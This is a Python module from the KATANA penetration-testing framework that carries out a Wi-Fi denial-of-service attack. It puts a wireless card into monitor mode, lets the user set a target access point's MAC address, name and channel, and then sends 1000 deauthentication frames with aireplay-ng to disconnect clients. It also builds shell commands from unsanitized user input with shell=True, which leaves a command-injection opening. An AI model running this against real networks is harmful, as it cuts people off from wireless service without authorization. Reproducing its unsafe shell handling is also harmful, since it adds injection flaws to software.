# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# @KATANA                    #
# Modules   : Wifi DOS       #
# Script by : RedToor        #
# Date      : 11/06/2015     #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Katana Core                #
from core.design import *    #
from core import help        #
from core import ping        #
d=DESIGN()                   #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Libraries                  #
import subprocess            #
import commands              #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
# Default                    #
# :-:-:-:-:-:-:-:-:-:-:-:-:- #
defaultcar="wlan0"
defaultint="mon1"
defaultmac="68:94:23:6E:48:5B"
defaultcha="9"
defaultess="LILI__WIFI"
# :-:-:-:-:-:-:-:-:-:-:-:-:- #

def run(para,parb,parc,pard,pare):
	global defaultcar,defaultint,defaultmac,defaultcha,defaultess
	defaultcar=para
	defaultint=parb
	defaultmac=parc
	defaultcha=pard
	defaultess=pare
	ddos(1)


def ddos(run):
	global defaultcar,defaultint,defaultmac,defaultcha,defaultess
	try:
		if run!=1:
			actions=raw_input(d.prompt("wifi/dos"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("intf","yes","Interface card",defaultcar)
			d.descrip("intm","yes","Int... monitor",defaultint)
			d.descrip("bssid","yes","Mac address",defaultmac)
			d.descrip("essid","yes","Name of AP",defaultess)
			d.descrip("chan","yes","Channel red",defaultcha)
			print ""
			print " "+Hlp+" Auxiliar help\n"
			Interfaces=commands.getoutput("airmon-ng | grep 'wlan' | awk '{print $1}'")
			Monitor=commands.getoutput("airmon-ng | grep 'mon' | awk '{print $1}'")
			Interfaces=Interfaces.replace("\n",",")
			Monitor=Monitor.replace("\n",",")
			if Interfaces=="":
				Interfaces="No network cards was found."
			if Monitor=="":
				Monitor="No monitor mode enabled, use 'start {Interface}' right here."
			print " Interfaces      : ",Interfaces
			print " Int... Monitor  : ",Monitor
			print ""
			if Monitor!="No monitor mode enabled, use 'start {Interface}' right here.":
				ping.scanwifi()
				print ""
			ddos(0)
		elif actions[0:8] == "set intf":
			defaultcar = actions[9:]
			d.change("intf",defaultcar)
			ddos(0)
		elif actions[0:8] == "set intm":
			defaultint = actions[9:]
			d.change("intf",defaultint)
			ddos(0)
		elif actions[0:9] == "set bssid":
			defaultmac = actions[10:]
			d.change("bssid",defaultmac)
			ddos(0)
		elif actions[0:9] == "set essid":
			defaultess = actions[10:]
			d.change("essid",defaultess)
			ddos(0)
		elif actions[0:8] == "set chan":
			defaultcha = actions[9:]
			d.change("chan",defaultcha)
			ddos(0)
		elif actions[0:5] == "start":
			start = actions[6:]
			subprocess.call('airmon-ng start '+start, shell=True)
			ddos(0)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				print " "+Alr+" Starting attack..."
				subprocess.call('aireplay-ng --deauth 1000 -a '+defaultmac+' '+defaultint, shell=True)
			except(KeyboardInterrupt, SystemExit):
				print("\n "+Alr+" Stopped DDOS")
		else:
			d.nocommand()
	except:
		d.kbi()
		exit()
	ddos(0)
